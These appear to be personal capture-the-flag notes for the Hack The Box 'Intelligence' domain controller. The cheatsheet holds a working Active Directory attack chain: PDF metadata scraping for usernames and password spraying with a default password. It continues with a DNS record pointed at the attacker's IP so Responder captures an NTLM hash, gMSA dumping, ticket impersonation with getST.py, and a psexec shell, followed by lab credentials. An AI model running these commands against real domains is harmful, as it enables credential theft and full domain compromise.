# Intelligence \[Medium]

## Report

Enumerating all usual vectors, we find nothing interesting the only notable discovery being two pdf files available for download on the web index page. We need to find a wordlist somehow and exiftool on these lorem ipsum pdfs mentions valid kerberos usernames. Run a script to parse through all available files based on date and retrieve a password from the docs since none of them are ASREP-roastable. We do find a default password and password spraying is successful for 'Tiffany.Molina'

A powershell script is pulled from an available SMB share which validates if systems on its DNS is up and sends an email if not. Modifying the server's DNS records and adding our system forces it to send a request our HTTP server with default creds which we intercept via Responder. Bloodhound shows the attack vector for 'Teddy.Graves' to become admin.

## Cheatsheet

```
Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) 
clock-skew: mean: 1d07h02m46s

http://10.10.10.248/documents/2020-01-01-upload.pdf
http://10.10.10.248/documents/2020-12-15-upload.pdf
this gives the idea for format to bruteforce

Run python and bash script to parse through pdf files hosted on web server
cat *.txt | grep -f patfile -A 2 -B 2 [f allows to pass a file containin gwords to match]
patfile:
username
password
intelligence
htb

Default password
NewIntelligenceCorpUser9876

nxc smb intelligence.htb -u userlist.txt -p NewIntelligenceCorpUser9876 --continue-on-success --verbose

Go to smb find a ps1 script that runs every 5 min, check all computers from domain starting with 'web' and performs get with default creds if fail, send mail to ted.

We add a dns record adding our ip and w responder we get ted's ntlm hash
python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 --action add --record web-0xdf --data 10.10.14.2 --type A 10.10.10.248
sudo responder -I tun0

python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d intelligence.htb

sudo faketime -f "+31h" python3 getST.py -spn www/dc.intelligence.htb -impersonate administrator -hashes :a9f4721de917a40fd9010ad815708184 -dc-ip 10.10.10.248 intelligence.htb/svc_int

add the domain controller [dc.[domain] to hosts when they ask for dc you mention the dc lol
export KRB5CCNAME=/home/jtripz/htb/rooms/intelligence/ticket.ccache; faketime -f '+31h' /usr/bin/python3 psexec.py intelligence.htb/administrator@dc.intelligence.htb -k -no-pass

b02ba3009de2927714c2905ff7066169

```

{% code title="Fetching all pdf files with date from first file we found to date of box release" %}
```python
import datetime
import requests

t = datetime.datetime(2020, 1, 1)
end = datetime.datetime(2021, 7, 4)

while True:
    url = t.strftime("http://intelligence.htb/documents/%Y-%m-%d-upload.pdf")
    resp = requests.get(url)
    if resp.status_code == 200:
        with open(t.strftime('%Y-%m-%d-upload.pdf'), 'wb') as f:
            f.write(resp.content)
    t = t + datetime.timedelta(days=1)
    if t > end:
        break

```
{% endcode %}

{% code title="Process all pdf files to find author list and read keywords from standard lorem ipsum content" %}
```bash
#!/bin/bash

TARGET_DIR="/home/jtripz/htb/rooms/intelligence/pdfs" # Replace with the actual path

# Check if the directory exists and is a directory
if [ ! -d "$TARGET_DIR" ]; then
  echo "Error: '$TARGET_DIR' is not a valid directory."
  exit 1
fi

# Loop through each item in the directory
for entry in "$TARGET_DIR"/*; do
  # Check if the current item is a regular file
  if [ -f "$entry" ]; then
    echo "Processing file: $entry"
    # Add your desired operations on the file here
    pdftotext "$entry"
    exiftool "$entry" | grep Creator | cut -d ':' -f 2 | tr -d '[:space:]' >> /home/jtripz/htb/rooms/intelligence/userlist.txt
    echo -e "\n" >> /home/jtripz/htb/rooms/intelligence/userlist.txt
  fi
done

```
{% endcode %}

<div align="left"><figure><img src="../../.gitbook/assets/image (112).png" alt=""><figcaption><p>getST.py find correct SPN to mention</p></figcaption></figure></div>

## Loot

### Creds

```
Tiffany.Molina:NewIntelligenceCorpUser9876
Ted.Graves:Mr.Teddy
```

### Enum

```
80
Documents - access denied
watch for source

88 Kerb
./kerbrute_linux_amd64 userenum -d intelligence.htb /usr/share/wordlists/cirt-default-usernames.txt --dc intelligence.htb 

SMB
guest - access denied
no user enumeration via smb

RPC
guest - access denied
```
